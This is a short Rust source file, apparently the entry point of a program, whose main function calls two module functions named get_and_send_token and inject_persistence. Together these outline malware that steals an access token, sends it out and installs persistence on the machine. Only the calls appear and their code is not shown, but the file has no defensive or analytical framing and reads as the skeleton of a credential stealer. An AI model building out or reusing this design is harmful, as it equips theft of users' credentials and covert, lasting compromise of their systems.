mod filesystem;
mod network;

fn main() {
    network::get_and_send_token();
    filesystem::inject_persistence();
}
